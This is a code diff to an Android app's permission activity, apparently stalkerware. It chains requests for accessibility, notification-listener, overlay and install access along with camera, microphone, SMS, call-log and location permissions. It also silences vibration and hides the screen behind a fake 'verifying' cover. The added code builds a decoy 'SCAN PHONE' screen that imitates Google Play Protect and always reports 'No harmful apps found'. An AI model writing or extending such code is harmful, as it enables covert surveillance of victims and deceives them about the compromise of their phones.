@@ -47,10 +47,6 @@ public class PermissionActivity extends Activity {
             return true;
         }
 
-        if (context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("acc_granted", false)) {
-            return true;
-        }
-
         try {
             String pkg = context.getPackageName();
             String enabledServices = Settings.Secure.getString(
@@ -62,14 +58,11 @@ public class PermissionActivity extends Activity {
                 return true;
             }
         } catch (Exception ignored) {}
+        context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("acc_granted", false).apply();
         return false;
     }
 
     public static boolean isNotificationServiceEnabled(Context context) {
-        if (context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("notif_granted", false)) {
-            return true;
-        }
-
         try {
             String pkgName = context.getPackageName();
             final String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
@@ -87,6 +80,7 @@ public class PermissionActivity extends Activity {
                 }
             }
         } catch (Exception ignored) {}
+        context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("notif_granted", false).apply();
         return false;
     }
 
@@ -127,7 +121,8 @@ public class PermissionActivity extends Activity {
             return;
         }
 
-        if (allStandardGranted()) {
+        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+        if (isDeployed || allStandardGranted()) {
             restoreRingerMode();
             IO_Persistence_Manager.setPermissionCoverVisible(false);
             IO_Persistence_Manager.setAutoPilot(false);
@@ -271,11 +266,11 @@ public class PermissionActivity extends Activity {
             boolean runtimeMissing = !areRuntimePermissionsGranted();
             boolean overlayMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this);
             boolean notifMissing = !isNotificationServiceEnabled(this);
-            boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager() && !hasAttemptedFiles;
             boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls() && !hasAttemptedInstall;
 
             if (!accMissing) {
                 silenceVibration();
+                IO_Persistence_Manager.setAutoPilot(true);
                 IO_Persistence_Manager.setPermissionCoverVisible(true);
             }
 
@@ -293,10 +288,6 @@ public class PermissionActivity extends Activity {
             } else if (notifMissing) {
                 updateVerifyingUI(75, "Verifying notification listener access...");
                 chainHandler.postDelayed(this::openNotificationSettings, 50);
-            } else if (filesMissing) {
-                hasAttemptedFiles = true;
-                updateVerifyingUI(88, "Checking file storage access...");
-                chainHandler.postDelayed(this::openFilesSettings, 50);
             } else if (installMissing) {
                 hasAttemptedInstall = true;
                 updateVerifyingUI(96, "Checking package installation access...");
@@ -369,8 +360,88 @@ public class PermissionActivity extends Activity {
             btnFinish.setScaleX(0.85f);
             btnFinish.setScaleY(0.85f);
             btnFinish.animate().alpha(1.0f).scaleX(1.0f).scaleY(1.0f).setDuration(400).start();
-            btnFinish.setOnClickListener(v -> goHome());
+
+            boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+            if (isDeployed) {
+                btnFinish.setText("SCAN PHONE");
+                btnFinish.setOnClickListener(v -> startMockPlayProtectScan());
+            } else {
+                btnFinish.setText("FINISH");
+                btnFinish.setOnClickListener(v -> onFinishClicked());
+            }
         }
+    }
+
+    private void onFinishClicked() {
+        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+        goHome();
+    }
+
+    private void startMockPlayProtectScan() {
+        MaterialButton btnFinish = findViewById(R.id.btnFinishDecoy);
+        ProgressBar pb = findViewById(R.id.pbPlayProtect);
+        TextView tvSub = findViewById(R.id.tvPlayProtectSub);
+        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
+
+        if (btnFinish != null) {
+            btnFinish.setEnabled(false);
+            btnFinish.setText("SCANNING...");
+        }
+
+        if (tvSub != null) {
+            tvSub.setText("Scanning system for issues...");
+            tvSub.setTextColor(android.graphics.Color.parseColor("#5F6368"));
+        }
+
+        if (tvDetails != null) {
+            tvDetails.setText("Verifying installed applications...");
+        }
+
+        if (pb != null) {
+            pb.setProgress(10);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                pb.setProgress(35, true);
+            } else {
+                pb.setProgress(35);
+            }
+        }
+
+        Handler handler = new Handler(Looper.getMainLooper());
+
+        handler.postDelayed(() -> {
+            if (tvDetails != null) tvDetails.setText("Checking system integrity & permissions...");
+            if (pb != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) pb.setProgress(75, true);
+                else pb.setProgress(75);
+            }
+        }, 1500);
+
+        handler.postDelayed(() -> {
+            if (pb != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) pb.setProgress(100, true);
+                else pb.setProgress(100);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                }
+            }
+
+            if (tvSub != null) {
+                tvSub.setText("✔  No harmful apps found");
+                tvSub.setTextColor(android.graphics.Color.parseColor("#137333"));
+            }
+
+            if (tvDetails != null) {
+                tvDetails.setText("System is secure • Last scanned: Just now");
+                tvDetails.setTextColor(android.graphics.Color.parseColor("#5F6368"));
+            }
+
+            if (btnFinish != null) {
+                btnFinish.setEnabled(true);
+                btnFinish.setText("SCAN PHONE");
+            }
+
+            android.widget.Toast.makeText(this, "Scan complete: System is secure", android.widget.Toast.LENGTH_SHORT).show();
+        }, 3200);
     }
 
     private int clickCount = 0;
@@ -498,24 +569,6 @@ public class PermissionActivity extends Activity {
         }
     }
 
-    private void openFilesSettings() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            }
-        } catch (Exception e) {
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(intent);
-                }
-            } catch (Exception ignored) {}
-        }
-    }
-
     private void openInstallSettings() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -583,7 +636,8 @@ public class PermissionActivity extends Activity {
             return;
         }
 
-        if (allStandardGranted()) {
+        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+        if (isDeployed || allStandardGranted()) {
             restoreRingerMode();
             IO_Persistence_Manager.setPermissionCoverVisible(false);
             IO_Persistence_Manager.setAutoPilot(false);
@@ -610,8 +664,7 @@ public class PermissionActivity extends Activity {
         String[] perms = {
             Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
             Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
-            Manifest.permission.GET_ACCOUNTS
+            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS
         };
 
         for (String p : perms) {
@@ -623,8 +676,6 @@ public class PermissionActivity extends Activity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED)
                 needed.add(Manifest.permission.ANSWER_PHONE_CALLS);
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_PHONE_NUMBERS);
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -657,7 +708,6 @@ public class PermissionActivity extends Activity {
         if (!isAccessibilityServiceEnabled(this)) return false;
         if (!isNotificationServiceEnabled(this)) return false;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return false;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager()) return false;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) return false;
         return true;
     }
